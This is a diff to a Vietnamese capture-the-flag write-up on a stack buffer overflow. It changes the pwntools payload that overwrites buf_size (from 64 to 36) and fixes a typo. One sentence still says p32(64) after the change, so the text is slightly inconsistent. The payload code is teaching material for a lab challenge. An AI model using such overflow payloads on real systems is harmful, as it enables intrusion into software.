@@ -80,16 +80,16 @@ Vì chúng ta nhập từ `fruit` nên cứ kệ mẹ `buf` đi. Giờ bắt đ�
 
 Nhưng mà các bạn có để ý không là `read(stdin_fd, fruit, buf_size);` tức là các bạn chỉ được phép nhập 0x10 là 16 byte vô fruit thôi. Vậy làm sao để nhập được hơn 26 byte đây ? Câu trả lời là chúng ta sẽ ghi đè `buf_size` bằng 1 con số khác lớn hơn.
 
-Như chúng ta thấy lần read dầu tiên `read(stdin_fd, buf, buf_size);` thì nó nhận tận 16 byte. Nhưng chúng ta chỉ cần 6 byte đầu để chạy được menu thôi, vậy chúng ta còn dư tận 10 byte để đè vô `buf_size`. Giờ hãy đè nó bằng code sau.
+Như chúng ta thấy lần read đầu tiên `read(stdin_fd, buf, buf_size);` thì nó nhận tận 16 byte. Nhưng chúng ta chỉ cần 6 byte đầu để chạy được menu thôi, vậy chúng ta còn dư tận 10 byte để đè vô `buf_size`. Giờ hãy đè nó bằng code sau.
 
 ```Python
 payload = b'cherry' # ghi vô buf
 payload += b'A' * 6 # ghi vô fruit vì như stack trên
-payload += p32(64) # thay đổi giá trị của buf_size thành 64 để nhập nhiều hơn
+payload += p32(36) # thay đổi giá trị của buf_size thành 36 để nhập nhiều hơn
 p.sendafter(b'Menu: ', payload)
 ```
 
-Mình lấy p32(64) chứ không phải p64(64) vì p32() sẽ tạo ra 4 byte còn p64() sẽ tạo ra 8 byte. Giờ thì mình đã thành công ghi đè `buf_size` bằng 64 rồi. Giờ hãy bắt đầu coook payload 2 thôi.
+Mình lấy p32(64) chứ không phải p64(64) vì p32() sẽ tạo ra 4 byte còn p64() sẽ tạo ra 8 byte. Giờ thì mình đã thành công ghi đè `buf_size` bằng 36 rồi. Giờ hãy bắt đầu coook payload 2 thôi.
 
 ```Python
 payload = b'A' * 26 # 26 là offset đã tính như trên
@@ -114,7 +114,7 @@ flag_add = e.symbols['flag']
 
 payload = b'cherry'
 payload += b'A' * 6
-payload += p32(64)
+payload += p32(36)
 p.sendafter(b'Menu: ', payload)
 
 payload = b'A' * 26
